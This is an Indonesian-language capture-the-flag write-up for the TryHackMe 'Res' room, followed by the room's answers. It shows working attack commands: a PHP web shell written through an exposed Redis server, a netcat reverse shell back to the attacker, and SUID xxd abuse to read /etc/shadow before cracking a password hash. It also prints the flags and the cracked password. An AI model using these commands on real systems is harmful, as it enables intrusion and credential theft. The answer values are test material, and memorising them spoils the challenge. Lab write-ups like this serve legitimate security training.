# CTF - RES
- TryHackMe Challenge: https://tryhackme.com/room/res
- IP Machine: 10.10.191.28

## Port Scanning
- Baris perintah: `nmap -sV -p- -T4 <IP Machine>`

- Buka halaman web `http://<IP_machine>` di browser


## Redis Exploit
- Akses Redis dengan tool redis-cli dengan perintah `redis-cli -h <IP_Machine>`

- Buat Shell melalui Redis dengan perintah sebagai berikut
```sh
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']) ?>"
save
```

- Lakukan pengujian shell melalui browser dengan url `http://10.10.191.28/shell.php?cmd=id`

- Buat Reverse Shell menggunakan netcat dengan perintah sebagai berikut:
```sh
nc -e /bin/bash <IP tun0> 4444
```

- Encode reverse shell menggunakan tool URL Encoder online https://www.urlencoder.org/
```sh
nc%20-e%20%2Fbin%2Fbash%20<IP tun0>%204444
```

- Buka terminal dan jalankan netcat dengan perintah `nc -lnvp <port>`

- Jalankan Reverse Shell melalui browser dengan url sebagai berikut:
```sh
http://<IP_Machine>/shell.php?cmd=nc%20-e%20%2Fbin%2Fbash%20<IP tun0>%204444
```

- Netcat berhasil terkoneksi

- Disini terlihat bahwa terminal belum interaktif. Jadi buat menjadi terminal interaktif dengan perintah sebagai berikut
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Gain Access
- Cari semua SUID yang dapat dieksekusi dengan perintah dibawah ini
```sh
find / -type f -user root -perm -4000 2>/dev/null
```

- Disini ditemukan SUID **/usr/bin/xxd**. Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/xxd/#file-read untuk melakukan eskalasi lebih lanjut. Gunakan script dibawah ini untuk membaca file **/etc/shadow** dan copy hash vianka
```sh
LFILE=/etc/shadow
/usr/bin/xxd "$LFILE" | /usr/bin/xxd -r
```

- Masukkan hash vianka ke dalam sebuah file dilocal dengan perintah `echo <hash> > <nama_file>`

- Crack hash vianka menggunakan tool john the ripper dengan perintah `john <wordlists> <hash_file>`

- Switch ke user vianka dengan perintah `su vianka` kemudian masukkan password yang sudah ditemukan

- Pada directory **/home** terdapat directory **vianka**. Pada directory **/home/vianka** terdapat file **user.txt** sebagai user flag. Buka file **user.txt**


## Pertanyaan dan Jawaban:

- **Pertanyaan:** Scan the machine, how many ports are open?
```sh
2
```

- **Pertanyaan:** What's is the database management system installed on the server?
```sh
redis
```

- **Pertanyaan:** What port is the database management system running on?
```sh
6379
```

- **Pertanyaan:** What's is the version of management system installed on the server?
```sh
6.0.7
```

- **Pertanyaan:** Compromise the machine and locate user.txt
```sh
thm{red1s_rce_w1thout_credent1als}
```

- **Pertanyaan:** What is the local user account password?
```sh
beautiful1
```

- **Pertanyaan:** Escalate privileges and obtain root.txt
```sh
thm{xxd_pr1v_escalat1on}
```